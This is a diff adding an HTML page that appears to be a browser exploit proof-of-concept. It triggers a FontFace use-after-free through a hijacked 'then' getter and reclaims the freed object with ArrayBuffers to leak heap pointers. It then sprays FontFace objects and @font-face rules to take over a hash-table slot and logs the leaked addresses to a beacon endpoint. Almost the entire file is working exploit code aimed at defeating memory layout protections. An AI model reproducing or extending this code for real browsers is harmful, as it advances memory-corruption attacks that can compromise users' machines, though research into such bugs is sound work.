@@ -1,0 +1,291 @@
+<!--
+  p651: Two-phase FontFace UAF — full member dump + hash table takeover attempt
+
+  GOAL: Discover the address of our own AB(192) backing store.
+
+  BACKGROUND (from audit PR #210):
+  - FontFace UAF leaks T (+0x58, HashTable*) and W (+0x68, WeakPtrImpl*)
+  - W's m_ptr (+0x08 inside WeakPtrImpl) = address of CSSFontFace = our AB address
+  - But we can't read at address W — we can only read our AB via DataView
+  - AB(80) can't reclaim HashTable (iso-heap, confirmed p613)
+  - BUT: new FontFace objects create WTF::HashTable in the SAME iso-heap
+
+  PLAN:
+  Phase 1: FontFace UAF → AB(192) reclaim → full 192B dump → get T1, W1
+  Phase 2: Create many new FontFace objects → their hash tables may reclaim T1's slot
+           Each new FontFace's addClient allocates in WTF::HashTable iso-heap
+  Phase 3: Second FontFace UAF → AB(192) reclaim → get T2, W2
+           If T2 = T1 (LIFO reuse), the engine reused the same slot
+  Phase 4: Compute T2-T1, W2-W1 relationships across two UAFs
+           Also dump nonzero bytes at ALL offsets to find hidden pointers
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p651</title></head>
+<body>p651: two-phase address leak
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+var retained = [];
+
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 3) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 4).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P651-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+function hexQ(lo, hi) { return '0x' + hex32(hi) + hex32(lo); }
+
+emit('START', navigator.userAgent ? navigator.userAgent.slice(0,60) : 'no-ua');
+flush();
+
+// ================================================================
+// PHASE 1: First FontFace UAF
+// ================================================================
+var ff1 = new FontFace('fa1', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+document.fonts.add(ff1);
+void ff1.loaded;
+retained.push(ff1);
+
+var sty1 = document.createElement('style');
+sty1.textContent = "@font-face { font-family: fs1; src: local(Arial); unicode-range: U+0042; }";
+document.head.appendChild(sty1);
+
+var fired1 = false;
+var bufs1 = [];
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (fired1) return undefined;
+    fired1 = true;
+    sty1.remove();
+    try { document.fonts.delete(this); } catch(e) {}
+    document.body.offsetHeight;
+    for (var i = 0; i < 64; i++) {
+      var ab = new ArrayBuffer(192);
+      bufs1.push(new Uint8Array(ab));
+    }
+    return undefined;
+  },
+  set: function() {}
+});
+
+document.fonts.load('1em fa1, fs1', 'AB');
+
+setTimeout(function() {
+try {
+  // Find the reclaimed buffer
+  var hit1 = -1;
+  for (var i = 0; i < bufs1.length; i++) {
+    var nz = 0;
+    for (var j = 0; j < 192; j++) if (bufs1[i][j] !== 0) nz++;
+    if (nz > 0) { hit1 = i; break; }
+  }
+  if (hit1 < 0) { emit('P1-MISS', 'ABORT'); flush(); return; }
+
+  var dv1 = new DataView(bufs1[hit1].buffer);
+  var T1_lo = dv1.getUint32(0x58, true);
+  var T1_hi = dv1.getUint32(0x5C, true);
+  var W1_lo = dv1.getUint32(0x68, true);
+  var W1_hi = dv1.getUint32(0x6C, true);
+  var rc1   = dv1.getUint32(0x00, true);
+
+  emit('P1-HIT', 'buf[' + hit1 + '] rc=' + rc1);
+  emit('P1-T1', hexQ(T1_lo, T1_hi));
+  emit('P1-W1', hexQ(W1_lo, W1_hi));
+  flush();
+
+  // FULL DUMP: find ALL nonzero qwords
+  var nzList = [];
+  for (var off = 0; off < 192; off += 4) {
+    var v = dv1.getUint32(off, true);
+    if (v !== 0) {
+      nzList.push('+' + off.toString(16) + '=' + hex32(v));
+    }
+  }
+  emit('P1-NZ', nzList.length + ' dwords');
+  // Send in chunks of ~100 chars
+  var chunk = '';
+  for (var i = 0; i < nzList.length; i++) {
+    chunk += nzList[i] + ' ';
+    if (chunk.length > 80 || i === nzList.length - 1) {
+      emit('P1-D', chunk.trim());
+      chunk = '';
+    }
+  }
+  flush();
+
+  // ================================================================
+  // PHASE 2: Create FontFace objects to fill HashTable iso-heap
+  // Each new FontFace creates a CSSFontFace which allocates a HashTable
+  // for its client list. These tables are in the SAME iso-heap as T1.
+  // If one lands at T1, we've taken over the slot.
+  // ================================================================
+  var ffSpray = [];
+  for (var i = 0; i < 200; i++) {
+    var name = 'spray' + i;
+    var f = new FontFace(name, 'local(Helvetica)', { unicodeRange: 'U+00' + (41 + (i % 26)).toString(16).toUpperCase() });
+    document.fonts.add(f);
+    ffSpray.push(f);
+    retained.push(f);
+  }
+  emit('P2-SPRAY', ffSpray.length + ' FontFace objects created');
+  flush();
+
+  // Also try: CSS @font-face rules (they create CSSFontFace internally)
+  var sty2 = document.createElement('style');
+  var rules = '';
+  for (var i = 0; i < 50; i++) {
+    rules += "@font-face { font-family: cspr" + i + "; src: local(Courier); unicode-range: U+00" + (41 + (i % 26)).toString(16).toUpperCase() + "; }\n";
+  }
+  sty2.textContent = rules;
+  document.head.appendChild(sty2);
+  retained.push(sty2);
+  emit('P2-CSS', '50 @font-face rules added');
+  flush();
+
+  // ================================================================
+  // PHASE 3: Second FontFace UAF
+  // ================================================================
+  // Reset the then trap for a second trigger
+  fired1 = false;
+  var bufs2 = [];
+
+  var ff2 = new FontFace('fa2', 'local(Helvetica)', { unicodeRange: 'U+0043' });
+  document.fonts.add(ff2);
+  void ff2.loaded;
+  retained.push(ff2);
+
+  var sty3 = document.createElement('style');
+  sty3.textContent = "@font-face { font-family: fs2; src: local(Arial); unicode-range: U+0044; }";
+  document.head.appendChild(sty3);
+
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function() {
+      if (fired1) return undefined;
+      fired1 = true;
+      sty3.remove();
+      try { document.fonts.delete(this); } catch(e) {}
+      document.body.offsetHeight;
+      for (var i = 0; i < 64; i++) {
+        var ab = new ArrayBuffer(192);
+        bufs2.push(new Uint8Array(ab));
+      }
+      return undefined;
+    },
+    set: function() {}
+  });
+
+  document.fonts.load('1em fa2, fs2', 'CD');
+
+  setTimeout(function() {
+  try {
+    var hit2 = -1;
+    for (var i = 0; i < bufs2.length; i++) {
+      var nz = 0;
+      for (var j = 0; j < 192; j++) if (bufs2[i][j] !== 0) nz++;
+      if (nz > 0) { hit2 = i; break; }
+    }
+    if (hit2 < 0) { emit('P3-MISS', 'no hit'); flush(); return; }
+
+    var dv2 = new DataView(bufs2[hit2].buffer);
+    var T2_lo = dv2.getUint32(0x58, true);
+    var T2_hi = dv2.getUint32(0x5C, true);
+    var W2_lo = dv2.getUint32(0x68, true);
+    var W2_hi = dv2.getUint32(0x6C, true);
+    var rc2   = dv2.getUint32(0x00, true);
+
+    emit('P3-HIT', 'buf[' + hit2 + '] rc=' + rc2);
+    emit('P3-T2', hexQ(T2_lo, T2_hi));
+    emit('P3-W2', hexQ(W2_lo, W2_hi));
+    flush();
+
+    // Full dump of phase 3
+    var nzList2 = [];
+    for (var off = 0; off < 192; off += 4) {
+      var v = dv2.getUint32(off, true);
+      if (v !== 0) {
+        nzList2.push('+' + off.toString(16) + '=' + hex32(v));
+      }
+    }
+    emit('P3-NZ', nzList2.length + ' dwords');
+    var chunk = '';
+    for (var i = 0; i < nzList2.length; i++) {
+      chunk += nzList2[i] + ' ';
+      if (chunk.length > 80 || i === nzList2.length - 1) {
+        emit('P3-D', chunk.trim());
+        chunk = '';
+      }
+    }
+    flush();
+
+    // ================================================================
+    // PHASE 4: Analysis
+    // ================================================================
+
+    // T reuse check
+    var T_same = (T1_lo === T2_lo && T1_hi === T2_hi);
+    emit('P4-TREUSE', T_same ? 'YES T1=T2' : 'NO T1!=T2');
+
+    // W reuse check
+    var W_same = (W1_lo === W2_lo && W1_hi === W2_hi);
+    emit('P4-WREUSE', W_same ? 'YES W1=W2' : 'NO W1!=W2');
+
+    // Delta computation (approximate, 32-bit parts)
+    if (!T_same) {
+      // Simple lo difference (ignoring carry for now)
+      var dT = T2_lo - T1_lo;
+      emit('P4-DT', 'T2-T1 lo=' + dT + ' (0x' + hex32(dT) + ')');
+    }
+    if (!W_same) {
+      var dW = W2_lo - W1_lo;
+      emit('P4-DW', 'W2-W1 lo=' + dW + ' (0x' + hex32(dW) + ')');
+    }
+
+    // T-W relationship within each phase
+    var TW1 = T1_lo - W1_lo;
+    var TW2 = T2_lo - W2_lo;
+    emit('P4-TW1', 'T1-W1 lo=' + TW1 + ' (0x' + hex32(TW1) + ')');
+    emit('P4-TW2', 'T2-W2 lo=' + TW2 + ' (0x' + hex32(TW2) + ')');
+
+    // Check if phase 1 buffer was modified by phase 2 spray
+    var p1mod = false;
+    var p1changes = [];
+    for (var off = 0; off < 192; off += 4) {
+      var oldV = dv1.getUint32(off, true);
+      // Compare against what we recorded
+      // (check if rc changed, T changed, etc.)
+      if (off === 0 && oldV !== rc1) {
+        p1changes.push('+0:rc ' + rc1 + '->' + oldV);
+        p1mod = true;
+      }
+    }
+    emit('P4-P1MOD', p1mod ? p1changes.join(' ') : 'unchanged');
+
+    // Check if any phase-2 spray FontFace hash tables show up
+    // (we can't directly read T1, but if the engine DID read from T1
+    //  during phase 2 creation, the interaction would show in phase 3)
+
+    emit('DONE', 'T1=' + hexQ(T1_lo, T1_hi) + ' T2=' + hexQ(T2_lo, T2_hi));
+    flush();
+
+  } catch(e3) { emit('P3-ERR', String(e3).slice(0,100)); flush(); }
+  }, 100);
+
+} catch(topErr) { emit('FATAL', String(topErr).slice(0,200)); flush(); }
+}, 100);
+})();
+</script>
+</body></html>
